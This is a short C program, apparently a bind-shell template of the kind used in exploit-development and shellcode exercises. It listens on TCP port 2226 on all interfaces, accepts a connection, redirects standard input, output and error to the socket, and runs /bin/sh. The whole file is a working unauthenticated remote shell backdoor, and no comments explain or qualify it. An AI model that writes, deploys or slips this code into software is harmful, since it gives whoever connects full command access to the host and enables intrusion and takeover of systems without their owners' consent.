#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main() {
    int sockfd, resultfd;
    int port = 2226;
    struct sockaddr_in my_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    int one = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    memset(&my_addr, 0, sizeof(my_addr));
    my_addr.sin_family = AF_INET;
    my_addr.sin_port = htons(port);
    my_addr.sin_addr.s_addr = INADDR_ANY;

    bind(sockfd, (struct sockaddr *)&my_addr, sizeof(my_addr));
    listen(sockfd, 0);

    resultfd = accept(sockfd, NULL, NULL);

    dup2(resultfd, 0);
    dup2(resultfd, 1);
    dup2(resultfd, 2);

    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    execve("/bin/sh", argv, envp);

    return 0;
}
